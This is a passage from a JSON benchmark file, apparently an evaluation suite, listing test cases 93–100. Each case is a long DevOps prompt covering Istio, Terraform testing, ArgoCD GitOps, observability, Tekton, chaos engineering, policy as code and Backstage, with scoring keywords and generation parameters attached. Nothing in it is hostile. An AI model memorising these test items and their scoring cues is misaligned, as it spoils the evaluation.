          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_93",
      "name": "Test 93: Service Mesh Advanced Configuration",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nImplement advanced Istio service mesh configurations:\n1. Create WASM filters for custom request/response manipulation\n2. Implement multi-cluster service discovery and routing\n3. Configure advanced circuit breaking with adaptive thresholds\n4. Implement canary deployments with automatic rollback\n5. Create custom authorization policies with OPA integration\n6. Configure distributed tracing with baggage propagation\n7. Implement traffic mirroring for testing\n8. Configure mutual TLS with cert rotation\n9. Implement rate limiting with Redis backend\n10. Create observability dashboards with Grafana\nInclude all YAML configurations and custom code.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement advanced Istio service mesh configurations:\n1. Create WASM filters for custom request/response manipulation\n2. Implement multi-cluster service discovery and routing\n3. Configure advanced circuit breaking with adaptive thresholds\n4. Implement canary deployments with automatic rollback\n5. Create custom authorization policies with OPA integration\n6. Configure distributed tracing with baggage propagation\n7. Implement traffic mirroring for testing\n8. Configure mutual TLS with cert rotation\n9. Implement rate limiting with Redis backend\n10. Create observability dashboards with Grafana\nInclude all YAML configurations and custom code.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_94",
      "name": "Test 94: Terraform Infrastructure Testing",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a comprehensive Terraform testing framework:\n1. Implement unit tests using terraform-plugin-testing\n2. Create integration tests with kitchen-terraform\n3. Implement compliance testing with OPA policies\n4. Build cost estimation and optimization checks\n5. Create security scanning with tfsec integration\n6. Implement drift detection and auto-remediation\n7. Build module dependency analysis\n8. Create performance testing for large infrastructures\n9. Implement blue-green deployment testing\n10. Generate test coverage reports\nInclude example modules and full test suites.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive Terraform testing framework:\n1. Implement unit tests using terraform-plugin-testing\n2. Create integration tests with kitchen-terraform\n3. Implement compliance testing with OPA policies\n4. Build cost estimation and optimization checks\n5. Create security scanning with tfsec integration\n6. Implement drift detection and auto-remediation\n7. Build module dependency analysis\n8. Create performance testing for large infrastructures\n9. Implement blue-green deployment testing\n10. Generate test coverage reports\nInclude example modules and full test suites.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_95",
      "name": "Test 95: GitOps Pipeline Implementation",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a complete GitOps pipeline with ArgoCD:\n1. Implement application manifests with Kustomize\n2. Create ApplicationSets for multi-environment deployments\n3. Implement secrets management with Sealed Secrets\n4. Configure automated image updates with Flux\n5. Implement progressive delivery with Flagger\n6. Create custom health checks for applications\n7. Implement RBAC policies for multi-tenant clusters\n8. Configure notifications to multiple channels\n9. Implement disaster recovery procedures\n10. Create monitoring for GitOps metrics\nInclude all configurations and automation scripts.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a complete GitOps pipeline with ArgoCD:\n1. Implement application manifests with Kustomize\n2. Create ApplicationSets for multi-environment deployments\n3. Implement secrets management with Sealed Secrets\n4. Configure automated image updates with Flux\n5. Implement progressive delivery with Flagger\n6. Create custom health checks for applications\n7. Implement RBAC policies for multi-tenant clusters\n8. Configure notifications to multiple channels\n9. Implement disaster recovery procedures\n10. Create monitoring for GitOps metrics\nInclude all configurations and automation scripts.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_96",
      "name": "Test 96: Observability Platform Integration",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a unified observability platform integration:\n1. Implement OpenTelemetry collectors with custom processors\n2. Create log aggregation with Fluentd/Fluent Bit\n3. Implement distributed tracing correlation\n4. Build custom Prometheus exporters\n5. Create synthetic monitoring with Playwright\n6. Implement SLO/SLI tracking with burn rate alerts\n7. Build anomaly detection using Prophet\n8. Create custom Grafana panels with plugins\n9. Implement event correlation across signals\n10. Build automated root cause analysis\nInclude all configurations and custom code.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a unified observability platform integration:\n1. Implement OpenTelemetry collectors with custom processors\n2. Create log aggregation with Fluentd/Fluent Bit\n3. Implement distributed tracing correlation\n4. Build custom Prometheus exporters\n5. Create synthetic monitoring with Playwright\n6. Implement SLO/SLI tracking with burn rate alerts\n7. Build anomaly detection using Prophet\n8. Create custom Grafana panels with plugins\n9. Implement event correlation across signals\n10. Build automated root cause analysis\nInclude all configurations and custom code.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_97",
      "name": "Test 97: Cloud Native CI/CD Pipeline",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a cloud-native CI/CD pipeline with Tekton:\n1. Define reusable Tasks for common operations\n2. Implement Pipelines with conditional execution\n3. Create custom ClusterTasks for security scanning\n4. Implement GitOps integration with automatic PR creation\n5. Build multi-arch image support\n6. Implement SBOM generation and signing\n7. Create quality gates with automatic rollback\n8. Implement cost tracking for builds\n9. Create custom dashboard for pipeline metrics\n10. Implement ChatOps integration\nInclude all YAML definitions and custom images.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a cloud-native CI/CD pipeline with Tekton:\n1. Define reusable Tasks for common operations\n2. Implement Pipelines with conditional execution\n3. Create custom ClusterTasks for security scanning\n4. Implement GitOps integration with automatic PR creation\n5. Build multi-arch image support\n6. Implement SBOM generation and signing\n7. Create quality gates with automatic rollback\n8. Implement cost tracking for builds\n9. Create custom dashboard for pipeline metrics\n10. Implement ChatOps integration\nInclude all YAML definitions and custom images.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_98",
      "name": "Test 98: Chaos Engineering Platform",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a comprehensive chaos engineering platform:\n1. Implement custom chaos experiments with Litmus\n2. Create GameDay automation scenarios\n3. Build steady-state hypothesis validation\n4. Implement blast radius control\n5. Create automated rollback on SLO breach\n6. Build chaos experiment scheduling\n7. Implement security chaos experiments\n8. Create cost-aware chaos experiments\n9. Build reporting and analytics dashboard\n10. Implement learning loop automation\nInclude experiment definitions and platform code.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive chaos engineering platform:\n1. Implement custom chaos experiments with Litmus\n2. Create GameDay automation scenarios\n3. Build steady-state hypothesis validation\n4. Implement blast radius control\n5. Create automated rollback on SLO breach\n6. Build chaos experiment scheduling\n7. Implement security chaos experiments\n8. Create cost-aware chaos experiments\n9. Build reporting and analytics dashboard\n10. Implement learning loop automation\nInclude experiment definitions and platform code.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_99",
      "name": "Test 99: Policy as Code Framework",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a comprehensive policy as code framework:\n1. Implement OPA policies for Kubernetes admission\n2. Create Falco rules for runtime security\n3. Build Sentinel policies for Terraform\n4. Implement CUE schemas for configuration validation\n5. Create policy testing frameworks\n6. Build policy violation remediation\n7. Implement policy versioning and rollback\n8. Create compliance reporting dashboards\n9. Build policy simulation environments\n10. Implement policy performance optimization\nInclude all policy definitions and tooling.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a comprehensive policy as code framework:\n1. Implement OPA policies for Kubernetes admission\n2. Create Falco rules for runtime security\n3. Build Sentinel policies for Terraform\n4. Implement CUE schemas for configuration validation\n5. Create policy testing frameworks\n6. Build policy violation remediation\n7. Implement policy versioning and rollback\n8. Create compliance reporting dashboards\n9. Build policy simulation environments\n10. Implement policy performance optimization\nInclude all policy definitions and tooling.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_100",
      "name": "Test 100: Platform Engineering Toolkit",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a complete platform engineering toolkit:\n1. Create developer portal with Backstage\n2. Implement service catalog with templates\n3. Build automated environment provisioning\n4. Create cost allocation and showback\n5. Implement developer productivity metrics\n6. Build self-service infrastructure\n7. Create platform API abstractions\n8. Implement golden paths for common use cases\n9. Build platform health dashboard\n10. Create platform documentation generator\nInclude all code, configurations, and templates.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a complete platform engineering toolkit:\n1. Create developer portal with Backstage\n2. Implement service catalog with templates\n3. Build automated environment provisioning\n4. Create cost allocation and showback\n5. Implement developer productivity metrics\n6. Build self-service infrastructure\n7. Create platform API abstractions\n8. Implement golden paths for common use cases\n9. Build platform health dashboard\n10. Create platform documentation generator\nInclude all code, configurations, and templates.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    }
  ]
}